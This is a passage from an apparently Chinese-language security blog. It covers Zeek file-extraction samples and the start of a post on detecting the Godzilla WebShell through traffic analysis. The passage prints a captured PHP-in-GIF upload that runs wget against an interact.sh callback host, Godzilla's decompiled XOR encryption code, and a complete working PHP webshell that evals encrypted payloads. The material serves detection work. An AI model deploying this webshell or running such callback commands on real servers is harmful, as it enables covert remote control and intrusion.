class="line">		<span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> orig = f$info<span class="variable">$extracted</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">local</span> split_orig = split_string(f$info<span class="variable">$extracted</span>, /\./);</span><br><span class="line">	<span class="built_in">local</span> extension = split_orig[|split_orig|-1];</span><br><span class="line"></span><br><span class="line">	<span class="comment"># æŒ‰ç…§æ—¥æœŸè¿›è¡Œæ–‡ä»¶çš„è¿˜åŸå­˜å‚¨</span></span><br><span class="line">	<span class="built_in">local</span> ntime = fmt(<span class="string">&quot;%D&quot;</span>, network_time());</span><br><span class="line">	<span class="built_in">local</span> ndate = sub_bytes(ntime, 1, 10);</span><br><span class="line">	<span class="built_in">local</span> dest_dir = fmt(<span class="string">&quot;%s%s&quot;</span>, FileExtraction::path, ndate);</span><br><span class="line">	mkdir(dest_dir);</span><br><span class="line">	<span class="built_in">local</span> dest = fmt(<span class="string">&quot;%s/%s-%s.%s&quot;</span>, dest_dir, f<span class="variable">$source</span>, f$info<span class="variable">$md5</span>, extension);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> cmd = fmt(<span class="string">&quot;mv %s %s&quot;</span>, orig, dest);</span><br><span class="line">	when ( <span class="built_in">local</span> result = Exec::run([<span class="variable">$cmd</span>=cmd]) )</span><br><span class="line">	    &#123;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( rename(orig, dest) )</span><br><span class="line">    	f$info<span class="variable">$extracted</span> = dest;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>ç¤ºä¾‹ - 2</strong></p>
<ul>
<li>Zeek - Files</li>
</ul>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-4.png" alt="image-20211101213845765"></p>
<ul>
<li>â€‹    Zeek - HTTP</li>
</ul>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-7.png" alt="image-20211101220829730"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-2f48899b463009a77234056c62f5c4fb.gif</span><br><span class="line">GIF89a213213123&lt;?php shell_exec(<span class="string">&quot;wget -c http://c5vi7ua23aksl756fsdgcf9186ayyyyoy.interact.sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>ç¤ºä¾‹ - 3</strong></p>
<ul>
<li>Zeek - Files</li>
</ul>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-5.png" alt="image-20211101214516921"></p>
<ul>
<li>Zeek - HTTP</li>
</ul>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-6.png" alt="image-20211101214915506"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-c77da62fa1b8f687ea423581657dcc2c.php</span><br><span class="line">&lt;?php <span class="built_in">echo</span> md5(<span class="string">&#x27;phpcollab_rce&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>



<p><strong>å°æç¤ºï¼š</strong></p>
<p>å½“å¯ç”¨æ–‡ä»¶æå–æ—¶ï¼Œè®°å¾—è°ƒæ•´Zeekçš„è¿™ä¸ªé…ç½®ï¼ŒæŒ‡å®šæœ€å¤§æå–æ•°æ®å¤§å°ï¼Œå¦åˆ™ä¼šå‡ºç°æå–è¢«æˆªæ®µçš„ç°è±¡ã€‚</p>
<ul>
<li>file-extract_limit.zeek</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redef FileExtract::default_limit = <span class="number">5000000000</span>;</span><br></pre></td></tr></table></figure>



<h4 id="é¡¹ç›®åœ°å€"><a href="#é¡¹ç›®åœ°å€" class="headerlink" title="é¡¹ç›®åœ°å€"></a>é¡¹ç›®åœ°å€</h4><ul>
<li><p><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus">canon/file-extraction-plus</a></strong></p>
</li>
<li><p><strong><a target="_blank" rel="noopener" href="https://github.com/hosom/file-extraction/actions">hosom/file-extraction</a></strong></p>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/30/Zeek-Detect-Godzilla-WebShell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/30/Zeek-Detect-Godzilla-WebShell/" class="post-title-link" itemprop="url">Zeek - Detect Godzilla WebShell</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2021-11-30 15:45:58" itemprop="dateCreated datePublished" datetime="2021-11-30T15:45:58+08:00">2021-11-30</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">æ›´æ–°äº</span>
        <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-06-21 00:47:42" itemprop="dateModified" datetime="2023-06-21T00:47:42+08:00">2023-06-21</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/NTA/" itemprop="url" rel="index"><span itemprop="name">NTA</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>13k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>12 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h1><p><strong>Godzillaï¼ˆå“¥æ–¯æ‹‰ï¼‰ï¼š</strong></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Godzilla.png" alt="image-20211211235918877"></p>
<p>â€‹    èº«é«˜ï¼š50ç±³</p>
<p>â€‹    ä½“é‡ï¼š2ä¸‡å¨</p>
<p>â€‹    æ”»å‡»æ–¹å¼ï¼šæ”¾å°„çƒ­çº¿ã€ç™½çƒ­å…‰ã€è¢‹é¼ è¸¢ã€æŠ•æ·ã€æå‡»ã€å°¾é­</p>
<p>â€‹    ä¸€ç§ç”Ÿæ´»åœ¨ä¾ç½—çºªå’Œç™½å©çºªä¹‹é—´çš„ç½•è§æµ·æ –çˆ¬è™«ç±»å’Œé™†ç”Ÿå…½ç±»çš„ä¸­é—´å½¢æ€ç”Ÿç‰©çš„æ®‹å­˜ä¸ªä½“ï¼Œå› æ°¢å¼¹è¯•éªŒçš„å½±å“è€Œå‡ºç°ã€‚æœ€åˆåœ¨å¤ªå¹³æ´‹ä¸Šå‡ºç°å¹¶è¢­å‡»è´§èˆ¹ï¼Œåç»å¤§æˆ·å²›åœ¨ä¸œäº¬ç™»é™†ï¼Œé€ æˆå·¨å¤§ç ´åã€‚æœ€ç»ˆåœ¨ä¸œäº¬æ¹¾è¢«èŠ¹æ³½åšå£«å‘æ˜çš„æ°´ä¸­æ°§æ°”ç ´åç´ ï¼ˆæ ¸èƒ½æ°§æ°”ç´ /æ°§æ°”ç ´åè€…ï¼‰æ€æ­»ã€‚</p>
<p>â€‹    ä»¥ä¸‹æ–‡ç« å°†ç®€è¿°å¦‚ä½•æ•è·è¯¥æ€ªå…½ï¼Œé¦–å…ˆæ´¾å¤§é‡ç›´å‡æœºå»æ¶é­”å²›åŠ«æŒå¦ä¸€ä½“å‹å·¨å¤§ä½†æ¸©å’Œè®¸å¤šçš„å·¨å…½ï¼šé‡‘åˆšã€‚ç„¶åè®©é‡‘åˆšæŠ—ä¼¤å®³äººç±»å·è¢­å°±å¥½ã€‚<strong>æœ¬ç¯‡å®Œï¼</strong></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Kong.webp" alt="image-20211211235918877"></p>
<p><strong>å®åœ¨ç¼–ä¸ä¸‹å»äº†ï¼Œæ¥ç‚¹æ­£ç»çš„å§ã€‚ã€‚ã€‚</strong></p>
<hr>
<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla"><strong>Godzilla</strong></a>ï¼ˆå“¥æ–¯æ‹‰ï¼‰æ˜¯ä¸€æ¬¾ä¼˜ç§€çš„WebShellæƒé™ç®¡ç†å·¥å…·ï¼Œå…¶ç‰¹ç‚¹æœ‰ï¼š</p>
<ul>
<li><p>å“¥æ–¯æ‹‰å…¨éƒ¨ç±»å‹çš„Shellå‡è¿‡å¸‚é¢æ‰€æœ‰é™æ€æŸ¥æ€</p>
</li>
<li><p>å“¥æ–¯æ‹‰æµé‡åŠ å¯†è¿‡å¸‚é¢å…¨éƒ¨æµé‡WAF</p>
</li>
<li><p>å“¥æ–¯æ‹‰çš„è‡ªå¸¦çš„æ’ä»¶æ˜¯å†°èã€èšå‰‘ä¸èƒ½æ¯”æ‹Ÿçš„</p>
</li>
</ul>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/zeek/zeek">Zeek</a></strong> ï¼ˆåŸåï¼šBroï¼‰ æ˜¯ä¸€ä¸ªå¼€æºçš„ç½‘ç»œæµé‡åˆ†æå™¨ã€‚è®¸å¤šè¿è¥å•†å°†Zeekä½œä¸ºç½‘ç»œå®‰å…¨ç›‘æ§å™¨ï¼ˆNSMï¼‰ï¼Œæ”¯æŒå¯¹å¯ç–‘æˆ–æ¶æ„æ´»åŠ¨çš„è°ƒæŸ¥ã€‚Zeekè¿˜æ”¯æŒå®‰å…¨é¢†åŸŸä»¥å¤–çš„å¹¿æ³›çš„æµé‡åˆ†æä»»åŠ¡ï¼ŒåŒ…æ‹¬æ€§èƒ½æµ‹é‡å’Œæ•…éšœæ’é™¤ã€‚å…¶ç‰¹ç‚¹æœ‰ï¼š</p>
<ul>
<li><p>æ·±åº¦åˆ†æï¼šZeekå¸¦æœ‰è®¸å¤šåè®®çš„åˆ†æå™¨ï¼Œå¯ä»¥åœ¨åº”ç”¨å±‚è¿›è¡Œé«˜çº§è¯­ä¹‰åˆ†æã€‚</p>
</li>
<li><p>é€‚åº”æ€§å’Œçµæ´»æ€§ï¼šZeekçš„ç‰¹å®šé¢†åŸŸè„šæœ¬è¯­è¨€å¯ä»¥å®ç°ç‰¹å®šåœ°ç‚¹çš„ç›‘æ§ç­–ç•¥ï¼Œè¿™æ„å‘³ç€å®ƒä¸å—é™äºä»»ä½•ç‰¹å®šçš„æ£€æµ‹æ–¹æ³•ã€‚</p>
</li>
<li><p>é«˜æ•ˆï¼šZeekä»¥é«˜æ€§èƒ½ç½‘ç»œä¸ºç›®æ ‡ï¼Œåœ¨å„ç§å¤§å‹ç½‘ç«™ä¸Šè¿è¡Œã€‚</p>
</li>
<li><p>é«˜åº¦çš„çŠ¶æ€æ€§ï¼šZeekå¯¹å…¶ç›‘æ§çš„ç½‘ç»œä¿æŒå¹¿æ³›çš„åº”ç”¨å±‚çŠ¶æ€ï¼Œå¹¶æä¾›ç½‘ç»œæ´»åŠ¨çš„é«˜çº§æ¡£æ¡ˆã€‚</p>
</li>
</ul>
<p><strong>ç¯å¢ƒ</strong></p>
<ul>
<li>Godzillaï¼š v4.0.1</li>
<li>Zeekï¼šv4.1.0</li>
<li>WebShellï¼š<ul>
<li>PHP XOR BASE64</li>
<li>JSP AES BASE64</li>
</ul>
</li>
</ul>
<h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><h2 id="PHP-XOR-BASE64"><a href="#PHP-XOR-BASE64" class="headerlink" title="PHP XOR BASE64"></a>PHP XOR BASE64</h2><h3 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><ul>
<li>åŸºç¡€é…ç½®ï¼šURLã€å¯†ç ã€å¯†é’¥ã€åŠ å¯†å™¨ç­‰ä¿¡æ¯ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<ul>
<li>å¯†ç ï¼šå’Œèšå‰‘ã€èœåˆ€ä¸€æ ·ï¼Œå¯†ç å°±æ˜¯POSTè¯·æ±‚ä¸­çš„å‚æ•°åç§°ã€‚ä¾‹å¦‚ï¼Œåœ¨æœ¬ä¾‹ä¸­å¯†ç ä¸º<code>Happy</code>ï¼Œé‚£ä¹ˆGodzillaæäº¤çš„æ¯ä¸ªè¯·æ±‚éƒ½æ˜¯<code>Happy=XXX</code>è¿™ç§å½¢å¼ã€‚ä»¥ä¸‹ç§°ä¸º<strong>pass</strong></li>
<li>å¯†é’¥ï¼šç”¨äºå¯¹è¯·æ±‚æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä¸è¿‡åŠ å¯†è¿‡ç¨‹ä¸­å¹¶éç›´æ¥ä½¿ç”¨å¯†é’¥æ˜æ–‡ï¼Œè€Œæ˜¯è®¡ç®—å¯†é’¥çš„MD5å€¼ï¼Œç„¶åå–å…¶å‰16ä½ç”¨äºåŠ å¯†ã€‚ä»¥ä¸‹ä¸ºç§°ä¸º<strong>key</strong></li>
<li>æœ‰æ•ˆè½½è·ï¼šç”Ÿæˆå¯¹åº”ç±»å‹çš„WebShell</li>
<li>åŠ å¯†å™¨ï¼šæ§åˆ¶WebShellçš„åŠ å¯†æ–¹å¼</li>
<li>è¯·æ±‚é…ç½®ï¼šä¸»è¦ç”¨äºè‡ªå®šä¹‰HTTPè¯·æ±‚å¤´ï¼Œä»¥åŠåœ¨æœ€ç»ˆçš„è¯·æ±‚æ•°æ®å‰åé¢å¤–å†è¿½åŠ ä¸€äº›æ‰°ä¹±æ•°æ®ï¼Œè¿›ä¸€æ­¥é™ä½æµé‡çš„ç‰¹å¾</li>
</ul>
</li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/%E5%AE%A2%E6%88%B7%E7%AB%AF.png" alt="image-20211130173607606"></p>
<ul>
<li><p>ç”±äºGodzillaçš„æºç ä½œè€…å¹¶æœªåšæ··æ·†ï¼Œæ‰€ä»¥é€šè¿‡<a target="_blank" rel="noopener" href="https://github.com/skylot/jadx"><strong>jadx</strong></a>å·¥å…·å¾ˆæ–¹ä¾¿å°±èƒ½å¾—åˆ°æºç ã€‚</p>
<p>å¯¹äº<strong>PHP XOR BASE64</strong>åŠ å¯†æ–¹å¼æ¥è¯´ï¼Œé¦–ä½å„é™„åŠ äº†<strong>16ä½</strong>çš„æ ¡éªŒå­—ç¬¦ä¸²ï¼ˆ<strong>pass</strong> + <strong>key</strong> è®¡ç®—çš„<strong>MD5</strong>å€¼ï¼‰ã€‚</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PhpXor</span> <span class="keyword">implements</span> <span class="title">Cryption</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.shell = context;</span><br><span class="line">        <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">        <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX().getBytes();</span><br><span class="line">        <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">        String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">new</span> String(<span class="keyword">this</span>.key));	<span class="comment">// æ ¡éªŒå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">this</span>.findStrLeft = findStrMd5.substring(<span class="number">0</span>, <span class="number">16</span>);												<span class="comment">// å‰16ä½MD5</span></span><br><span class="line">        <span class="keyword">this</span>.findStrRight = findStrMd5.substring(<span class="number">16</span>);													<span class="comment">// å16ä½MD5</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>è¯·æ±‚åŠ å¯†<ul>
<li>å¯¹äºæ˜æ–‡æ•°æ®ä½¿ç”¨<strong>key</strong>è¿›è¡ŒæŒ‰ä½å¼‚æˆ–-&gt;base64ç¼–ç -&gt;urlç¼–ç ï¼Œå®ç°æ•°æ®åŠ å¯†ï¼›</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> E(data);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          Log.error(e);</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡keyæŒ‰ä½å¼‚æˆ–</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">byte</span>[] E(<span class="keyword">byte</span>[] cs) &#123;</span><br><span class="line">      <span class="keyword">int</span> len = cs.length;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">          cs[i] = (<span class="keyword">byte</span>) (cs[i] ^ <span class="keyword">this</span>.key[(i + <span class="number">1</span>) &amp; <span class="number">15</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>å“åº”è§£å¯†</p>
<ul>
<li><p>é¦–å…ˆè°ƒç”¨<code>findStr</code>æ–¹æ³•åˆ é™¤å“åº”æ•°æ®ä¸­çš„å‰å16ä½æ ¡éªŒå­—ç¬¦ä¸²ï¼›</p>
</li>
<li><p>ç„¶ååˆ©ç”¨<code>base64Decode</code>æ–¹æ³•è§£ç å­—ç¬¦ä¸²ï¼›</p>
</li>
<li><p>æœ€åä½¿ç”¨<strong>key</strong>æŒ‰ä½å¼‚æˆ–ï¼Œå®ç°æ•°æ®è§£å¯†ï¼›</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="keyword">null</span> || data.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> D(findStr(data));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] D(String data) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] cs = functions.base64Decode(data);</span><br><span class="line">    <span class="keyword">int</span> len = cs.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        cs[i] = (<span class="keyword">byte</span>) (cs[i] ^ <span class="keyword">this</span>.key[(i + <span class="number">1</span>) &amp; <span class="number">15</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cs;</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">findStr</span><span class="params">(<span class="keyword">byte</span>[] respResult)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> functions.subMiddleStr(<span class="keyword">new</span> String(respResult), <span class="keyword">this</span>.findStrLeft, <span class="keyword">this</span>.findStrRight);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ¼”ç¤ºæ•°æ® - æ•°æ®è§£å¯†</strong></p>
<p>![image-20211201143236656](./Zeek-Detect-Godzilla-WebShell/ç¤ºä¾‹æ•°æ® - 1.png)</p>
<h3 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h3><p>â€‹    <strong>PHP XOR BASE64</strong> ç±»å‹çš„åŠ å¯†Shellçš„æœåŠ¡å™¨ç«¯ä»£ç å¦‚ä¸‹ï¼Œå…¶ä¸­å®šä¹‰äº†<code>encode</code>å‡½æ•°ï¼Œç”¨äºåŠ å¯†æˆ–è§£å¯†è¯·æ±‚æ•°æ®ã€‚ç”±äºæ˜¯é€šè¿‡æŒ‰ä½å¼‚æˆ–å®ç°çš„åŠ å¯†ï¼Œæ‰€ä»¥<code>encode</code>å‡½æ•°å³å¯ç”¨äºåŠ å¯†ï¼ŒåŒæ—¶ä¹Ÿå¯ç”¨äºè§£å¯†ã€‚æ•´ä¸ªShellçš„åŸºæœ¬æ‰§è¡Œæµç¨‹æ˜¯ï¼šæœåŠ¡å™¨æ¥æ”¶åˆ°Godzillaå‘é€çš„ç¬¬ä¸€ä¸ªè¯·æ±‚åï¼Œç”±äºæ­¤æ—¶å°šæœªå»ºç«‹sessionï¼Œæ‰€ä»¥å°†POSTè¯·æ±‚æ•°æ®è§£å¯†åï¼ˆå¾—åˆ°çš„å†…å®¹ä¸ºShellæ“ä½œä¸­æ‰€éœ€è¦ç”¨åˆ°çš„ç›¸å…³<code>php</code>å‡½æ•°å®šä¹‰ä»£ç ï¼‰å­˜å…¥sessionä¸­ï¼Œåç»­Godzillaåªä¼šæäº¤ç›¸å…³æ“ä½œå¯¹åº”çš„å‡½æ•°åç§°ï¼ˆå¦‚è·å–ç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨å¯¹åº”çš„å‡½æ•°ä¸º<code>getFile</code>ï¼‰å’Œç›¸å…³å‚æ•°ï¼Œè¿™æ ·å“¥æ–¯æ‹‰çš„ç›¸å…³æ“ä½œå°±ä¸éœ€è¦å‘é€å¤§é‡çš„è¯·æ±‚æ•°æ®ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;Happy&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;bdf2e45b317c4585&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

